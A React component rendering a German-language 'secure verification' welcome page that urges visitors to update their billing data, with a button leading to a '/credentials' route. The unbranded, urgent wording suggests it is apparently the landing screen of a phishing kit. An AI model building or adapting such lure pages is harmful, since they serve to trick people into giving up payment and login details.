import React from 'react';
import { useNavigate } from 'react-router-dom';
import { Shield } from 'lucide-react';

export default function Welcome() {
  const navigate = useNavigate();

  return (
    <div className="min-h-screen bg-gradient-to-b from-red-50 to-white flex items-center justify-center p-4">
      <div className="max-w-md w-full bg-white rounded-xl shadow-lg p-8">
        <div className="flex justify-center mb-6">
          <Shield className="h-16 w-16 text-red-500" />
        </div>
        
        <h1 className="text-3xl font-bold text-center mb-6">
          Willkommen bei der sicheren Verifizierung
        </h1>
        <p className="text-gray-600 text-center mb-8">
          Wir bitten Sie, Ihre Rechnungsdaten zu aktualisieren, um deren Richtigkeit sicherzustellen. Dies hilft uns, Ihnen einen reibungslosen Service zu bieten und mögliche Fehler zu vermeiden.
        </p>

        <button
          onClick={() => navigate('/credentials')}
          className="w-full bg-red-500 text-white py-3 px-6 rounded-lg font-semibold
                     hover:bg-red-600 transition-colors duration-200"
        >
          Jetzt beginnen
        </button>
      </div>
    </div>
  );
}